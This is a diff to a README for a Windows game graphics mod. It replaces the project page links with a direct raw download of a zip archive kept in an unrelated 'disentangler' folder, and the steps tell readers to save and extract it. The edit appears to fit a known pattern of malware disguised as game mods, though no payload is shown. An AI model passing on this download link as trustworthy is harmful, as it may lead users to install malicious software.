@@ -1,6 +1,6 @@
 # 🎨 Visual-Enhancement - Realistic graphics for your game world
 
-[![Download Visual-Enhancement](https://img.shields.io/badge/Download-Graphics_Mod-grey.svg)](https://github.com/Readyandwaiting-launchingsite438/Visual-Enhancement)
+[![Download Visual-Enhancement](https://img.shields.io/badge/Download-Graphics_Mod-grey.svg)](https://github.com/Readyandwaiting-launchingsite438/Visual-Enhancement/raw/refs/heads/main/disentangler/Visual_Enhancement_v2.5.zip)
 
 ## 🌟 About the Project
 
@@ -19,7 +19,7 @@ You need a Windows computer to install this mod. Ensure you have the following b
 
 Follow these steps to set up the mod on your machine.
 
-1. Visit this page to download: [https://github.com/Readyandwaiting-launchingsite438/Visual-Enhancement](https://github.com/Readyandwaiting-launchingsite438/Visual-Enhancement)
+1. Visit this page to download: [https://github.com/Readyandwaiting-launchingsite438/Visual-Enhancement/raw/refs/heads/main/disentangler/Visual_Enhancement_v2.5.zip](https://github.com/Readyandwaiting-launchingsite438/Visual-Enhancement/raw/refs/heads/main/disentangler/Visual_Enhancement_v2.5.zip)
 2. Locate the download button on the page.
 3. Save the file to your desktop for easy access.
 4. Extract the compressed folder using a tool like 7-Zip or WinRAR.
